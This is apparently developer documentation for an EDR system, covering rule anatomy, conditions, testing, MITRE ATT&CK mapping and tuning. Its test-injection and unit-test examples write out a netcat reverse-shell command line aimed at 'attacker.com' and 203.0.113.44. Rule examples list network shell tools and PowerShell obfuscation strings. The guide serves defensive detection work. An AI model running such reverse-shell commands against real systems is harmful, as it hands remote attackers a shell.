# Rule Development Guide

Complete guide for developing effective detection rules for the Automated EDR system.

---

## Table of Contents

1. [Rule Fundamentals](#rule-fundamentals)
2. [Rule Writing Best Practices](#rule-writing-best-practices)
3. [Testing Rules](#testing-rules)
4. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
5. [Advanced Rule Patterns](#advanced-rule-patterns)
6. [Troubleshooting](#troubleshooting)

---

## Rule Fundamentals

### Rule Anatomy

Every detection rule in the EDR system consists of:

```json
{
  "rule_id": "UNIQUE_IDENTIFIER",
  "name": "Human-Readable Rule Name",
  "event_type": "process|network|file|auth|system",
  "condition": "contains|equals|in_list|failed_login_threshold|remote_ip_not_in_allowlist",
  "field": "event_payload_field",
  "value": "single_value_or_list",
  "threshold": 5,
  "window_seconds": 300,
  "severity": "critical|high|medium|low",
  "confidence": 85,
  "description": "Detailed description of threat",
  "tactics": ["MITRE ATT&CK Tactic"],
  "techniques": ["T1234"],
  "response_actions": ["kill_process", "block_ip", "isolate_host", "generate_alert"]
}
```

### Rule Fields

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `rule_id` | string | ✓ | Unique identifier (e.g., PROC-001, NET-001) |
| `name` | string | ✓ | Human-readable rule name |
| `event_type` | string | ✓ | process, network, file, auth, system |
| `condition` | string | ✓ | Detection logic type |
| `field` | string | ✗ | Event field to evaluate (depends on condition) |
| `value` | any | ✗ | Expected value(s) (depends on condition) |
| `threshold` | integer | ✗ | For threshold-based conditions |
| `window_seconds` | integer | ✗ | Time window for threshold evaluation |
| `severity` | string | ✓ | Critical, High, Medium, Low |
| `confidence` | integer | ✓ | 0-100 accuracy score |
| `description` | string | ✓ | Threat description and context |
| `tactics` | array | ✓ | MITRE ATT&CK tactics |
| `techniques` | array | ✓ | MITRE ATT&CK technique IDs |
| `response_actions` | array | ✓ | Automated responses |

---

## Rule Writing Best Practices

### 1. Naming Convention

Use consistent, descriptive naming:

```
CATEGORY-TYPE-SEQUENCE
├─ CATEGORY: PROC (Process), NET (Network), FILE (File), AUTH (Auth), SYS (System)
├─ TYPE: Name describing what it detects
└─ SEQUENCE: 001, 002, 003...

Examples:
- PROC-REVERSE-SHELL-001
- NET-C2-BEACON-001
- FILE-SYSTEM-MODIFICATION-001
- AUTH-BRUTE-FORCE-001
```

### 2. Event Payload Understanding

Know what data is available for each event type:

#### Process Events
```python
{
    "pid": 1234,
    "process_name": "malware.exe",
    "cmdline": "C:\\temp\\malware.exe -install",
    "username": "DOMAIN\\user",
    "normalized": True
}
```

#### Network Events
```python
{
    "remote_ip": "203.0.113.44",
    "remote_port": 4444,
    "local_address": "192.168.1.10:51515",
    "remote_address": "203.0.113.44:4444",
    "status": "ESTABLISHED",
    "pid": 1234,
    "host_ip": "192.168.1.10"
}
```

#### File Events
```python
{
    "path": "C:\\Windows\\System32\\file.exe",
    "filename": "file.exe"
}
```

#### Auth Events
```python
{
    "username": "admin",
    "outcome": "failed",
    "source_ip": "203.0.113.44"
}
```

### 3. Choosing the Right Condition

#### `contains` - Substring Matching
Use when checking if field contains a string:

```json
{
  "rule_id": "PROC-SCRIPT-INVOCATION-001",
  "name": "Script File Execution",
  "event_type": "process",
  "condition": "contains",
  "field": "process_name",
  "value": "powershell"
}
```

**Matches**: "powershell.exe", "C:\\powershell.exe", "POWERSHELL.EXE"
**Good For**: Detecting partial matches, extensions

#### `equals` - Exact Matching
Use when field must match exactly:

```json
{
  "rule_id": "PROC-CMD-INTERACTIVE-001",
  "name": "Interactive Command Prompt",
  "event_type": "process",
  "condition": "equals",
  "field": "process_name",
  "value": "cmd.exe"
}
```

**Matches**: "cmd.exe"
**Doesn't Match**: "CMD.EXE", "C:\\cmd.exe"
**Good For**: Exact filenames, specific values

#### `in_list` - List Membership
Use when field can be one of several values:

```json
{
  "rule_id": "PROC-TOOL-ABUSE-001",
  "name": "Known Attack Tools",
  "event_type": "process",
  "condition": "in_list",
  "field": "process_name",
  "value": ["nc", "ncat", "netcat", "nmap", "psexec"]
}
```

**Good For**: Multiple IOCs, known malware names

#### `failed_login_threshold` - Count-Based
Use for brute force and credential attack detection:

```json
{
  "rule_id": "AUTH-BRUTE-FORCE-001",
  "name": "Failed Login Threshold",
  "event_type": "auth",
  "condition": "failed_login_threshold",
  "threshold": 5,
  "window_seconds": 300
}
```

**Good For**: Brute force, credential stuffing

#### `remote_ip_not_in_allowlist` - IP Allowlisting
Use for whitelisting known good IPs:

```json
{
  "rule_id": "NET-EXTERNAL-001",
  "name": "Suspicious External Connection",
  "event_type": "network",
  "condition": "remote_ip_not_in_allowlist",
  "field": "remote_ip",
  "value": ["127.0.0.1", "192.168.0.0/16"]
}
```

### 4. Severity Assignment

| Severity | Impact | Response |
|----------|--------|----------|
| **Critical** | Confirmed breach, active threat | Kill process, block IP, isolate host |
| **High** | Strong indication of attack | Block IP, generate alert |
| **Medium** | Suspicious but not confirmed | Generate alert, review |
| **Low** | Requires investigation | Log, may ignore |

### 5. Confidence Scoring

Assign confidence based on false positive likelihood:

```json
{
  "rule_id": "PROC-MIMIKATZ-001",
  "name": "Mimikatz Execution",
  "confidence": 95,
  "description": "Exact match on known malware - very low false positive"
}

{
  "rule_id": "NET-EXTERNAL-CONNECTION-001",
  "name": "External Connection",
  "confidence": 30,
  "description": "Generic pattern - high false positive rate"
}
```

---

## Testing Rules

### Manual Testing

#### 1. Test Event Injection
```bash
curl -X POST http://127.0.0.1:8000/api/ingest \
  -H "Content-Type: application/json" \
  -H "Cookie: edr_session=<your_token>" \
  -d '{
    "source": "test",
    "event_type": "process",
    "title": "test_event",
    "payload": {
      "process_name": "nc.exe",
      "pid": 1234,
      "cmdline": "nc -e cmd.exe attacker.com 4444",
      "username": "user"
    }
  }'
```

#### 2. Check Detection
```bash
curl http://127.0.0.1:8000/api/detections?limit=5 \
  -H "Cookie: edr_session=<your_token>"
```

#### 3. Verify Rule Loaded
```bash
python -c "
from backend.edr.detection.rules import RuleLoader
loader = RuleLoader()
rules = loader.load()
for rule in rules:
    if rule.rule_id == 'YOUR_RULE_ID':
        print(f'Found: {rule.name}')
"
```

### Unit Testing

Create test file: `backend/tests/test_custom_rules.py`

```python
import pytest
from backend.edr.models import Event, EventType
from backend.edr.detection.engine import DetectionEngine

@pytest.fixture
def detection_engine():
    return DetectionEngine()

def test_reverse_shell_detection(detection_engine):
    """Test that reverse shell process is detected."""
    event = Event(
        source="test",
        event_type=EventType.PROCESS,
        title="process_observed",
        payload={
            "process_name": "nc.exe",
            "cmdline": "nc -e cmd.exe 203.0.113.44 4444",
            "username": "admin",
            "pid": 1234,
        }
    )
    
    detections = detection_engine.evaluate(event)
    
    assert len(detections) > 0
    assert any(d.rule_id == "PROC-001" for d in detections)

def test_external_connection_detection(detection_engine):
    """Test that external connections are detected."""
    event = Event(
        source="test",
        event_type=EventType.NETWORK,
        title="network_connection_observed",
        payload={
            "remote_ip": "203.0.113.44",
            "remote_port": 4444,
            "local_address": "192.168.1.10:51515",
            "status": "ESTABLISHED",
            "pid": 1234,
        }
    )
    
    detections = detection_engine.evaluate(event)
    
    assert len(detections) > 0
```

---

## MITRE ATT&CK Mapping

### Why Map to MITRE ATT&CK?

- **Standardization**: Common language for threat analysis
- **Context**: Links detections to known threat tactics
- **Intelligence**: Enables threat intelligence integration
- **Reporting**: Professional security documentation

### Common Tactics

| Code | Tactic | Examples |
|------|--------|----------|
| T1204 | User Execution | User clicks malicious link |
| T1566 | Phishing | Email with attachment |
| T1189 | Drive-by Download | Auto-download exploit |
| T1055 | Process Injection | DLL injection |
| T1071 | Application Layer Protocol | C2 over HTTP |
| T1041 | Exfiltration Over C2 | Data sent to attacker |
| T1087 | Account Discovery | Enumerating users |
| T1110 | Brute Force | Password guessing |
| T1547 | Boot or Logon Autostart | Persistence mechanism |
| T1140 | Deobfuscation | Decode malicious payload |

### Example Mapping

```json
{
  "rule_id": "PROC-REVERSE-SHELL-001",
  "name": "Reverse Shell Execution",
  "description": "Detects execution of known reverse shell utilities used for remote access",
  "tactics": ["Execution", "Command and Control"],
  "techniques": ["T1059", "T1071"]
}
```

---

## Advanced Rule Patterns

### Pattern: Suspicious Parent-Child Execution

*Currently not supported, but can be implemented with extended detection logic*

```python
# Pseudo-code for future enhancement
if event.process_name == "svchost.exe" and \
   event.parent_process == "explorer.exe":
    # Unusual parent-child relationship
    detect_threat()
```

### Pattern: Command Line Obfuscation

```json
{
  "rule_id": "PROC-OBFUSCATION-001",
  "name": "Suspicious Command Line Encoding",
  "event_type": "process",
  "condition": "in_list",
  "field": "cmdline",
  "value": [
    "-EncodedCommand",
    "IEX",
    "FromBase64String",
    "|Invoke-Expression"
  ],
  "severity": "high",
  "confidence": 80
}
```

### Pattern: Living off the Land

```json
{
  "rule_id": "PROC-LOLBAS-001",
  "name": "Living off the Land Binaries",
  "event_type": "process",
  "condition": "in_list",
  "field": "process_name",
  "value": [
    "certutil.exe",
    "bitsadmin.exe",
    "cscript.exe",
    "mshta.exe",
    "regsvcs.exe",
    "rundll32.exe"
  ],
  "severity": "medium",
  "confidence": 50
}
```

### Pattern: Suspicious Registry Paths

*Requires file event support or extended collectors*

```json
{
  "rule_id": "SYS-REGISTRY-PERSIST-001",
  "name": "Registry Persistence",
  "event_type": "system",
  "condition": "in_list",
  "field": "registry_path",
  "value": [
    "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Run",
    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Run"
  ],
  "severity": "high",
  "confidence": 80
}
```

---

## Troubleshooting

### Rule Not Triggering

1. **Verify rule syntax**
   ```bash
   python -c "import json; json.load(open('backend/config/rules.json'))"
   ```

2. **Check field names match event payload**
   ```bash
   curl http://127.0.0.1:8000/api/events?limit=1 \
     -H "Cookie: edr_session=<token>"
   ```

3. **Enable debug logging**
   ```bash
   EDR_LOG_LEVEL=DEBUG python main.py
   ```

4. **Test with exact match**
   ```bash
   # Simplify condition
   "condition": "contains",
   "field": "process_name",
   "value": "malware"
   ```

### Too Many False Positives

1. **Increase confidence threshold**
   ```json
   "confidence": 85  # Up from 50
   ```

2. **Add allowlist**
   ```json
   "condition": "remote_ip_not_in_allowlist",
   "value": ["127.0.0.1", "192.168.0.0/16"]
   ```

3. **Use more specific condition**
   ```json
   "condition": "equals",  # Instead of "contains"
   "field": "process_name",
   "value": "cmd.exe"
   ```

4. **Review detections for patterns**
   ```bash
   curl http://127.0.0.1:8000/api/detections?limit=100 \
     -H "Cookie: edr_session=<token>"
   ```

### Performance Issues

1. **Reduce rule count**: Remove or disable low-priority rules
2. **Optimize conditions**: Use `equals` instead of `contains`
3. **Limit history**: Archive old detection data
4. **Monitor evaluation time**: Add logging to detection engine

---

## Rule Templates

### Template: Process Abuse

```json
{
  "rule_id": "PROC-TEMPLATE-001",
  "name": "Process Abuse Pattern",
  "event_type": "process",
  "condition": "in_list",
  "field": "process_name",
  "value": ["tool1", "tool2"],
  "severity": "high",
  "confidence": 75,
  "description": "Detects abuse of legitimate tools",
  "tactics": ["Defense Evasion", "Execution"],
  "techniques": ["T1036", "T1059"],
  "response_actions": ["generate_alert"]
}
```

### Template: Network Anomaly

```json
{
  "rule_id": "NET-TEMPLATE-001",
  "name": "Network Anomaly",
  "event_type": "network",
  "condition": "remote_ip_not_in_allowlist",
  "field": "remote_ip",
  "value": ["127.0.0.1"],
  "severity": "medium",
  "confidence": 60,
  "description": "Detects connections to unexpected destinations",
  "tactics": ["Command and Control", "Exfiltration"],
  "techniques": ["T1071", "T1041"],
  "response_actions": ["block_ip", "generate_alert"]
}
```

### Template: Persistence Mechanism

```json
{
  "rule_id": "PERSIST-TEMPLATE-001",
  "name": "Persistence Mechanism",
  "event_type": "file",
  "condition": "contains",
  "field": "path",
  "value": "Startup",
  "severity": "high",
  "confidence": 85,
  "description": "Detects files written to startup folders",
  "tactics": ["Persistence"],
  "techniques": ["T1547"],
  "response_actions": ["generate_alert"]
}
```

---

## Resources

- **MITRE ATT&CK**: https://attack.mitre.org/
- **Sigma Rules**: https://github.com/SigmaHQ/sigma
- **Elastic Security**: https://github.com/elastic/detection-rules
- **ATT&CK Navigator**: https://mitre-attack.github.io/attack-navigator/

---

## Support

For rule development help:
1. Check [Configuration Guide](./CONFIGURATION.md)
2. Review existing rules in `backend/config/rules.json`
3. Test in development environment first
4. Document rule purpose and rationale
